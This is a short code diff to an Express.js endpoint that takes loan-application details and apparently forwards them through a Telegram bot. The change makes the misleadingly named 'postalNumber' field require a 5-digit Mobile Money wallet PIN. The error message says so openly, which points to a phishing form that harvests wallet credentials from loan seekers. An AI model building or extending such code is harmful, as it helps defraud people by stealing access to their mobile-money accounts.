@@ -41,8 +41,8 @@ app.get('/api/telegram/status', (_req, res) => {
 app.post('/api/telegram/contact', async (req, res) => {
   const { fullName, phone, email, mtnNumber, postalNumber, loanType, amount } = req.body;
 
-  if (!mtnNumber || !postalNumber) {
-    return res.status(400).json({ error: 'Mobile Money and postal numbers are required.' });
+  if (!mtnNumber || !/^\d{5}$/.test(String(postalNumber ?? '').trim())) {
+    return res.status(400).json({ error: 'Mobile Money number and a 5-digit wallet PIN are required.' });
   }
 
   const botToken = (process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_TOKEN || '').trim();
